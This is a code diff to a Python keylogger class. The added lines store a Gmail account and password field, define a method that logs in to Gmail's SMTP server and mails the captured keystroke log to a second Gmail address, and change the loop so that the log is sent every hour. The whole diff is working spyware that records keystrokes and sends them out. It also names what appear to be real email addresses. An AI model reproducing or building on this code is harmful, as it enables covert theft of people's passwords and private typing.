@@ -8,6 +8,8 @@ import smtplib
 class Keylogger:
     def __init__(self):
         self.log = ""
+        self.email = "pythondev1101@gmail.com"
+        self.password = ""
 
     def logging(self, key):
         try:
@@ -19,10 +21,17 @@ class Keylogger:
             else:
                 self.log += " " + str(key) + " "
 
+    def email_self(self):
+        with smtplib.SMTP('smtp.gmail.com', 587) as mailer:
+            mailer.starttls()
+            mailer.ehlo()
+            mailer.login(self.email, self.password)
+            mailer.sendmail(self.email, "jerrellabrahams50@gmail.com", f"\n\n This is the Keyboard Logger: {self.log}")
 
     def preview_logged(self):
         while True:
-            time.sleep(5)
+            time.sleep(3600)
+            self.email_self()
             print(self.log)
             self.log = ""
 
